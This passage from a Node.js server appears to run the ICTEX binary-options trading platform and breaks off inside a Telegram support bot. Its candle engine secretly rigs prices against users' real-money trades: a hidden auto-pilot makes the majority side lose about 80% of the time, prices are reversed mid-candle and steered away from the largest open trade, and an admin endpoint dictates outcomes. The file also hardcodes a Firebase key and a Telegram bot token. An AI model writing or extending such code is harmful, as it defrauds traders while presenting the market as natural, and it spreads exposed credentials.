// --- START: main app server.js (v30.5 - Ultimate Admin Engine & Natural Physics) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;
const MAX_CANDLES = 5000;

// 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
const SMART_AUTO_PILOT = true; 
const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin

// 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
const POOL_CONFIG = {
    ADMIN_SHARE: 0.70, // 70% to Admin
    USER_SHARE: 0.30   // 30% to Payout Pool
};
let globalPayoutPool = 0;
let globalAdminProfit = 0;

const markets = {}; 
const activeTradesDb = {}; 

// Sync Global Pool from Firebase
db.ref('admin/revenue_pool').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    globalPayoutPool = parseFloat(data.payoutPool) || 0;
    globalAdminProfit = parseFloat(data.adminProfit) || 0;
});

function updateGlobalPoolInDB(payoutChange, adminChange) {
    globalPayoutPool += payoutChange;
    globalAdminProfit += adminChange;
    
    if (globalPayoutPool < 0) globalPayoutPool = 0;
    
    db.ref('admin/revenue_pool').update({
        payoutPool: globalPayoutPool,
        adminProfit: globalAdminProfit
    }).catch(err => console.error("Pool Update Error:", err));
}

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Firebase Listeners ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const nodeData = fbMarkets[marketId] || {};
        activeTradesDb[marketId] = nodeData.activeTrades || {};
        const type = nodeData.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// 1. Natural Market Generation
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

    const finalHigh = Math.max(safeOpen, close) + upperWick;
    const finalLow = Math.min(safeOpen, close) - lowerWick;

    if (!isLive) {
        return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
    }

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: true, targetHigh: roundPrice(finalHigh), targetLow: roundPrice(finalLow), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 2. ADVANCED Exact Pattern & Custom Engine
function generateDynamicCandle(timestamp, lastCandle, cmdObj) {
    let command = '';
    let speed = 'normal';
    let wickType = 'natural';
    
    if (typeof cmdObj === 'string') {
        command = cmdObj.trim();
    } else if (cmdObj) {
        command = (cmdObj.command || '').trim();
        speed = cmdObj.speed || 'normal';
        wickType = cmdObj.wickType || 'natural';
    }

    const open = lastCandle.close;
    const baseVol = open * (0.00008 + Math.random() * 0.0001);
    
    // --- 1. Mega Candle Logic (4 to 6 times bigger) ---
    if (command === 'MEGA_GREEN' || command === 'MEGA_RED') {
        const isGreen = command === 'MEGA_GREEN';
        const bodySize = baseVol * (4 + Math.random() * 2); // 4x to 6x
        const upperWick = baseVol * 0.2;
        const lowerWick = baseVol * 0.2;
        const close = isGreen ? open + bodySize : open - bodySize;
        const high = Math.max(open, close) + upperWick;
        const low = Math.min(open, close) - lowerWick;
        return {
            timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
            isPredetermined: true, isNatural: false, 
            targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
            pattern: 'NORMAL', speed, animationStyle: 'smooth', isAdminCommand: true
        };
    }
    
    // --- 2. 2x Breakout Reverse Logic ---
    if (command === 'BREAKOUT_2X_REVERSE') {
        const prevBody = Math.abs(lastCandle.close - lastCandle.open) || baseVol;
        const bodySize = prevBody * 2.5; // Double the previous body size
        const isGreen = (lastCandle.close <= lastCandle.open); // Color is exactly opposite of last candle
        
        let upperWick = baseVol * (0.5 + Math.random());
        let lowerWick = baseVol * (0.5 + Math.random());
        
        // Apply wick override if set
        if (wickType === 'none') { upperWick = 0; lowerWick = 0; }
        else if (wickType === 'long') { upperWick *= 3; lowerWick *= 3; }

        const close = isGreen ? open + bodySize : open - bodySize;
        const high = Math.max(open, close) + upperWick;
        const low = Math.min(open, close) - lowerWick;
        return {
            timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
            isPredetermined: true, isNatural: false, 
            targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
            pattern: 'NORMAL', speed, animationStyle: 'spike_first', isAdminCommand: true
        };
    }

    // --- 3. Random Natural Logic ---
    if (command === 'GREEN_RANDOM') {
        const greenPatterns = ['GREEN', 'BULLISH_MARUBOZU', 'GREEN_HAMMER', 'GREEN_SHOOTING_STAR', 'GREEN_SPINNING_TOP'];
        command = greenPatterns[Math.floor(Math.random() * greenPatterns.length)];
    } else if (command === 'RED_RANDOM') {
        const redPatterns = ['RED', 'BEARISH_MARUBOZU', 'RED_HAMMER', 'RED_SHOOTING_STAR', 'RED_SPINNING_TOP'];
        command = redPatterns[Math.floor(Math.random() * redPatterns.length)];
    }

    // --- 4. Classic Patterns ---
    let bodySize, upperWick, lowerWick, close, high, low;

    switch (command) {
        case 'GREEN': 
            bodySize = baseVol; close = open + bodySize; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; break;
        case 'RED': 
            bodySize = baseVol; close = open - bodySize; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; break;
        case 'BULLISH_MARUBOZU': 
            bodySize = baseVol * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU': 
            bodySize = baseVol * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'GREEN_HAMMER': 
            bodySize = baseVol * 0.3; close = open + bodySize; upperWick = 0; lowerWick = baseVol * 2.5; break;
        case 'RED_HAMMER': 
            bodySize = baseVol * 0.3; close = open - bodySize; upperWick = 0; lowerWick = baseVol * 2.5; break;
        case 'GREEN_SHOOTING_STAR': 
            bodySize = baseVol * 0.3; close = open + bodySize; upperWick = baseVol * 2.5; lowerWick = 0; break;
        case 'RED_SHOOTING_STAR': 
            bodySize = baseVol * 0.3; close = open - bodySize; upperWick = baseVol * 2.5; lowerWick = 0; break;
        case 'DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = baseVol; lowerWick = baseVol; break;
        case 'LONG_LEGGED_DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = baseVol * 3; lowerWick = baseVol * 3; break;
        case 'DRAGONFLY_DOJI': 
            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = baseVol * 2.5; break;
        case 'GRAVESTONE_DOJI': 
            bodySize = open * 0.000002; close = open - bodySize; upperWick = baseVol * 2.5; lowerWick = 0; break;
        case 'GREEN_SPINNING_TOP': 
            bodySize = baseVol * 0.4; close = open + bodySize; upperWick = baseVol * 1.5; lowerWick = baseVol * 1.5; break;
        case 'RED_SPINNING_TOP': 
            bodySize = baseVol * 0.4; close = open - bodySize; upperWick = baseVol * 1.5; lowerWick = baseVol * 1.5; break;
        case 'HUGE_PUMP': 
            bodySize = baseVol * 5; close = open + bodySize; upperWick = baseVol * 0.2; lowerWick = baseVol * 0.2; break;
        case 'HUGE_DUMP': 
            bodySize = baseVol * 5; close = open - bodySize; upperWick = baseVol * 0.2; lowerWick = baseVol * 0.2; break;
        default: 
            bodySize = baseVol; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5;
    }

    // Apply Wick Overrides
    if (wickType === 'none') {
        upperWick = 0; lowerWick = 0;
    } else if (wickType === 'long') {
        upperWick *= 3; lowerWick *= 3;
    }

    high = Math.max(open, close) + upperWick;
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
        isPredetermined: true, isNatural: false, 
        targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
        pattern: command, speed, animationStyle: 'normal', isAdminCommand: true
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false); 
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
}

// 🔥 CORE LOGIC: Controls Candle Output
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        
        // Admin Command Priority
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle, marketData.nextCandleCommand);
            marketData.nextCandleCommand = null;
        } 
        
        // Auto Pilot Logic (Only runs if admin didn't send a command)
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let immediateUpVol = 0, immediateDownVol = 0;
            let immediateUpPayout = 0, immediateDownPayout = 0;
            let futureUpVol = 0, futureDownVol = 0;
            const nextPeriod = currentPeriod + TIMEFRAME;
            
            Object.values(trades).forEach(t => {
                const isDemo = t.isDemo === true; 
                const payoutRate = t.payoutRate || 1.85;
                const expectedPayout = t.amount * payoutRate;

                if (!isDemo && !t.isProcessedForPool) {
                    const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
                    const userCut = t.amount * POOL_CONFIG.USER_SHARE;
                    updateGlobalPoolInDB(userCut, adminCut);
                    
                    t.isProcessedForPool = true;
                    db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
                }

                if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
                    if (t.direction === 'UP') {
                        immediateUpVol += t.amount;
                        if (!isDemo) immediateUpPayout += expectedPayout;
                    }
                    if (t.direction === 'DOWN') {
                        immediateDownVol += t.amount;
                        if (!isDemo) immediateDownPayout += expectedPayout;
                    }
                } else {
                    if (t.direction === 'UP') futureUpVol += t.amount;
                    if (t.direction === 'DOWN') futureDownVol += t.amount;
                }
            });

            // Rule 1: Conflict Resolution
            if (immediateUpVol > 0 || immediateDownVol > 0) {
                let targetDirection = 'DOJI';
                const canAffordUp = immediateUpPayout <= globalPayoutPool;
                const canAffordDown = immediateDownPayout <= globalPayoutPool;

                if (!canAffordUp && !canAffordDown) {
                    targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
                } else if (!canAffordUp) {
                    targetDirection = 'RED';
                } else if (!canAffordDown) {
                    targetDirection = 'GREEN';
                } else {
                    if (Math.random() < ADMIN_WIN_RATIO) {
                        targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
                    } else {
                        targetDirection = immediateUpVol > immediateDownVol ? 'GREEN' : 'RED';
                    }
                }

                newCandle = generateDynamicCandle(currentPeriod, lastCandle, { command: targetDirection });
                newCandle.isAdminCommand = false; // Flag as Auto-pilot generated
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                
                let payoutChange = 0;
                let adminProfitChange = 0;

                if (targetDirection === 'GREEN') {
                    payoutChange = -immediateUpPayout;
                    adminProfitChange = immediateDownVol;
                } else if (targetDirection === 'RED') {
                    payoutChange = -immediateDownPayout;
                    adminProfitChange = immediateUpVol;
                } else {
                    adminProfitChange = immediateUpVol + immediateDownVol;
                }

                if (payoutChange !== 0 || adminProfitChange !== 0) {
                    updateGlobalPoolInDB(payoutChange, adminProfitChange);
                }
            } 
            // Rule 2: Smart Price Anchoring
            else if (futureUpVol > 0 || futureDownVol > 0) {
                let biggestFutureTrade = null;
                Object.values(trades).forEach(t => {
                    if (t.expiryTimestamp > nextPeriod + 2000 && !t.isDemo) {
                        if (!biggestFutureTrade || t.amount > biggestFutureTrade.amount) {
                            biggestFutureTrade = t;
                        }
                    }
                });

                let driftCommand = 'DOJI';
                
                if (biggestFutureTrade) {
                    const tradeOpenPrice = biggestFutureTrade.openPrice;
                    const currentPrice = lastCandle.close;
                    const isDangerUP = biggestFutureTrade.direction === 'UP' && currentPrice >= (tradeOpenPrice - 0.00002);
                    const isDangerDOWN = biggestFutureTrade.direction === 'DOWN' && currentPrice <= (tradeOpenPrice + 0.00002);

                    const rand = Math.random();

                    if (isDangerUP) {
                        if (rand < 0.60) driftCommand = 'RED'; 
                        else if (rand < 0.85) driftCommand = 'RED_RANDOM';
                        else driftCommand = 'DOJI';
                    } 
                    else if (isDangerDOWN) {
                        if (rand < 0.60) driftCommand = 'GREEN'; 
                        else if (rand < 0.85) driftCommand = 'GREEN_RANDOM';
                        else driftCommand = 'DOJI';
                    } 
                    else {
                        driftCommand = Math.random() > 0.5 ? 'GREEN' : 'RED';
                    }
                } else {
                    driftCommand = Math.random() > 0.5 ? 'GREEN' : 'RED';
                }

                newCandle = generateDynamicCandle(currentPeriod, lastCandle, { command: driftCommand });
                newCandle.isAdminCommand = false;
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00004);
            }
        }
        
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// 🔥 TICK ENGINE: Advanced Natural Animation Math 🔥
function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    
    // Admin Speed Control
    let speedMultiplier = 1.0;
    if (candle.speed === 'fast') speedMultiplier = 1.5;
    if (candle.speed === 'slow') speedMultiplier = 0.6;
    
    let effProgress = Math.min((timeElapsed * speedMultiplier) / TIMEFRAME, 1.0);

    // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
    // Only runs if AutoPilot generated this candle (Admins are locked)
    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT && !candle.isAdminCommand) {
        candle.isMidEvaluated = true;
        
        const trades = activeTradesDb[marketData.marketId] || {};
        let upVol = 0, downVol = 0;
        let upPayout = 0, downPayout = 0;
        
        Object.values(trades).forEach(t => {
            if (!t.isDemo && !t.isTournament && t.expiryTimestamp && t.expiryTimestamp <= currentPeriod + TIMEFRAME + 2000) {
                const payout = t.amount * (t.payoutRate || 1.85);
                if (t.direction === 'UP') { upVol += t.amount; upPayout += payout; }
                if (t.direction === 'DOWN') { downVol += t.amount; downPayout += payout; }
            }
        });

        if (upVol > 0 || downVol > 0) {
            const canAffordUp = upPayout <= globalPayoutPool;
            const canAffordDown = downPayout <= globalPayoutPool;
            let newTarget = null;
            const volatility = candle.open * 0.0001;

            if (!canAffordUp && !canAffordDown) {
                newTarget = upPayout > downPayout ? 'RED' : 'GREEN';
            } else if (!canAffordUp) {
                newTarget = 'RED';
            } else if (!canAffordDown) {
                newTarget = 'GREEN';
            } else {
                if (Math.random() < ADMIN_WIN_RATIO) {
                    newTarget = upVol > downVol ? 'RED' : 'GREEN';
                }
            }

            if (newTarget) {
                if (newTarget === 'RED' && candle.targetClose >= candle.open) {
                    candle.targetClose = candle.open - volatility - (Math.random() * volatility);
                    candle.targetLow = Math.min(candle.targetLow, candle.targetClose - volatility);
                } else if (newTarget === 'GREEN' && candle.targetClose <= candle.open) {
                    candle.targetClose = candle.open + volatility + (Math.random() * volatility);
                    candle.targetHigh = Math.max(candle.targetHigh, candle.targetClose + volatility);
                }
            }
        }
    }
    // -----------------------------------------------------------------------

    let idealPrice = candle.open;
    const pattern = candle.pattern || 'NORMAL';

    // Advanced Natural Animation Styles for Mega/Breakout
    if (candle.animationStyle === 'spike_first') {
        if (candle.targetClose > candle.open) { 
            // Pumps super high, then retraces to form an upper wick
            if (effProgress < 0.5) idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.5);
            else idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((effProgress - 0.5) / 0.5);
        } else { 
            // Dumps super low, then retraces to form a lower wick
            if (effProgress < 0.5) idealPrice = candle.open - (candle.open - candle.targetLow) * (effProgress / 0.5);
            else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.5) / 0.5);
        }
    } 
    // Classic Pattern Animations
    else if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
        if (effProgress < 0.6) {
            idealPrice = candle.open - (candle.open - candle.targetLow) * (effProgress / 0.6);
        } else {
            idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.6) / 0.4);
        }
    } 
    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
        if (effProgress < 0.6) {
            idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.6);
        } else {
            idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((effProgress - 0.6) / 0.4);
        }
    }
    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
        if (effProgress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.3);
        else if (effProgress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((effProgress - 0.3) / 0.4);
        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.7) / 0.3);
    }
    else {
        // Smooth natural progression for standard candles
        const easeProgress = 1 - Math.pow(1 - effProgress, 3);
        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
    }

    const noiseFactor = effProgress < 1.0 ? (1 - Math.pow(effProgress, 2)) : 0; 
    const volatility = candle.open * 0.00005;
    const noise = (Math.random() - 0.5) * volatility * noiseFactor;

    marketData.currentPrice = idealPrice + noise;
    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

    if (timeElapsed >= TIMEFRAME - 1500) {
        marketData.currentPrice = candle.targetClose;
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) }));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

app.post('/api/admin/command', (req, res) => {
    const { marketId, command, speed, wickType } = req.body;
    if (!marketId || !command) {
        return res.status(400).json({ error: 'Missing marketId or command' });
    }
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = { command, speed, wickType };
        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command} (Speed: ${speed}, Wicks: ${wickType})`);
        res.json({ success: true, message: `Command ${command} received` });
    } else {
        res.status(404).json({ error: 'Market not found on server' });
    }
});

// Main Loop
let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

// ==========================================
// 🔥 TELEGRAM 2FA BOT SYSTEM 🔥
// ==========================================
const https = require('https');
const TELEGRAM_BOT_TOKEN = "8740566281:AAF7MUaumUIrO7IJ7Hr93kG0EzOOHvr444U";
let lastUpdateId = 0;

function sendTelegramMessage(chatId, text) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' });
        const req = https.request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    if (data.ok && data.result) {
                        resolve(data.result.message_id);
                    } else {
                        resolve(null);
                    }
                } catch (e) {
                    resolve(null);
                }
            });
        });
        req.on('error', (e) => {
            console.error("Telegram Send Error:", e);
            resolve(null);
        });
        req.write(payload);
        req.end();
    });
}

function deleteTelegramMessage(chatId, messageId) {
    if (!messageId) return;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
    const payload = JSON.stringify({ chat_id: chatId, message_id: messageId });
    const req = https.request(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    }, (res) => {
        res.on('data', () => {});
    });
    req.on('error', (e) => console.error("Telegram Delete Error:", e));
    req.write(payload);
    req.end();
}

// ওটিপি লিংকিং ও সাপোর্ট সেশন ট্র্যাক করার জন্য গ্লোবাল অবজেক্ট
const activeLinkingSessions = {};
const activeSupportSessions = {};
const adminSupportMap = {}; // ফরওয়ার্ড করা মেসেজের বিপরীতে ইউজারের চ্যাট আইডি ট্র্যাকিং

const ADMIN_OWNER_ID = "7504616242"; // অ্যাডমিন ওনার আইডি

// অ্যাডমিনের কাছে মেসেজ ফরওয়ার্ড করার হেল্পার ফাংশন
function forwardTelegramMessage(toChatId, fromChatId, messageId) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/forwardMessage`;
        const payload = JSON.stringify({ chat_id: toChatId, from_chat_id: fromChatId, message_id: messageId });
        const req = https.request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    if (data.ok && data.result) {
                        resolve(data.result.message_id);
                    } else {
                        resolve(null);
                    }
                } catch (e) {
                    resolve(null);
                }
            });
        });
        req.on('error', (e) => {
            console.error("Telegram Forward Error:", e);
            resolve(null);
        });
        req.write(payload);
        req.end();
    });
}

function pollTelegramUpdates() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
    const req = https.get(url, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', async () => {
            try {
                const response = JSON.parse(body);
                if (response.ok && response.result.length > 0) {
                    for (const update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message) {
                            // শুধুমাত্র নতুন ও তাজা মেসেজগুলো প্রোসেস করা হবে (সর্বোচ্চ ৬০ সেকেন্ড আগের)
                            const msgDate = update.message.date || 0;
                            const nowSec = Math.floor(Date.now() / 1000);
                            if (msgDate < nowSec - 60) {
                                continue;
                            }

                            const text = update.message.text ? update.message.text.trim() : "";
                            const chatId = String(update.message.chat.id);
                            const textLower = text.toLowerCase();
                            
                            // ১. অ্যাডমিনের রিপ্লাই প্রসেসিং (সোয়াইপ রিপ্লাই হ্যান্ডলার)
                            if (chatId === ADMIN_OWNER_ID && update.message.reply_to_message) {
                                const replyToId = update.message.reply_to_message.message_id;
                                const targetUserId = adminSupportMap[replyToId];
                                if (targetUserId && text) {
                                    await sendTelegramMessage(targetUserId, `💬 *Response from Support:* \n\n${text}`);
                                }
                                continue;
                            }

                            // ২. সাধারণ ইউজার চ্যাট ফ্লো
                            if (textLower === '/start') {
                                if (activeSupportSessions[chatId]) {
                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nPlease end the active help session first using /endhelp before using other commands.`);
                                    continue;
                                }
                                await sendTelegramMessage(chatId, `✨ *WELCOME TO ICTEX SECURE GATEWAY* ✨\n\nHello Trader! I am the official ICTEX Security and 2FA Bot, protecting your assets with bank-grade encryption.\n\n*Available Commands (Tap to select):*\n🔑 /linkictex - Link account securely.\n👤 /accounts - View all connected profiles.\n💬 /help - Open a direct support session.`);
                            } 
                            else if (textLower === '/linkictex') {
                                if (activeSupportSessions[chatId]) {
                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nPlease end the active help session first using /endhelp before using other commands.`);
                                    continue;
                                }

                                if (activeLinkingSessions[chatId]) {
                                    clearTimeout(activeLinkingSessions[chatId].timeoutRef);
                                    if (activeLinkingSessions[chatId].linkMessageId) {
                                        deleteTelegramMessage(chatId, activeLinkingSessions[chatId].linkMessageId);
                                    }
                                }
                                
                                const linkMessageId = await sendTelegramMessage(chatId, `🔑 *ICTEX Secure Account Link Initiation*\n\nPlease go to your **ICTEX Trading Terminal -> Profile Settings**, copy your 15-digit secure linking code, and paste it here.\n\n*Code format:* \`XXXXX - XXXXX - XXXXX\`\n\n_Note: You have exactly 1 minute to submit your code before this session expires._`);
                                
                                activeLinkingSessions[chatId] = {
                                    linkMessageId: linkMessageId,
                                    expiresAt: Date.now() + 60000,
                                    timeoutRef: setTimeout(async () => {
                                        // ১ মিনিট শেষ হলে মূল লিংক রিকোয়েস্ট মেসেজটি ডিলিট করা
                                        if (linkMessageId) {
                                            deleteTelegramMessage(chatId, linkMessageId);
                                        }
                                        
                                        // এক্সপায়ার্ড নোটিফিকেশন পাঠানো
                                        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ *Linking Session Expired*\n\nYour 1-minute account linking session has expired. Please type /linkictex to initiate a new secure pairing session.`);
                                        
                                        // এক্সপায়ার্ড মেসেজটি ১০ সেকেন্ড পর মুছে ফেলা
                                        setTimeout(() => {
                                            if (expiredMessageId) {
                                                deleteTelegramMessage(chatId, expiredMessageId);
                                            }
                                        }, 10000);
                                        
                                        delete activeLinkingSessions[chatId];
                                    }, 60000)
                                };
                            }
                            else if (textLower === 'my accounts' || textLower === '/accounts') {
                                if (activeSupportSessions[chatId]) {
                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nPlease end the active help session first using /endhelp before using other commands.`);
                                    continue;
                                }

                                try {
                                    const usersSnap = await db.ref('users').once('value');
                                    const users = usersSnap.val() || {};
                                    const matchedAccounts = [];
                                    
                                    for (const [uid, u] of Object.entries(users)) {
                                        if (u && u.telegramChatId == chatId) {
                                            matchedAccounts.push({
                                                email: u.email,
                                                name: u.nickname || u.name || 'Trader',
                                                numericId: u.numericId || uid.substring(0, 8)
                                            });
                                        }
                                    }
                                    
                                    if (matchedAccounts.length > 0) {
                                        let reply = `👤 *Your Linked ICTEX Accounts:*\n\n`;
                                        matchedAccounts.forEach((acc, idx) => {
                                            reply += `${idx + 1}. *${acc.name}* (ID: \`${acc.numericId}\`) - ${acc.email}\n`;
                                        });
                                        await sendTelegramMessage(chatId, reply);
                                    } else {
                                        await sendTelegramMessage(chatId, `❌ *No linked accounts found.*\n\nPlease link your ICTEX account by pasting your secure linking code.`);
                                    }
                                } catch (err) {
                                    console.error("Error fetching linked accounts:", err);
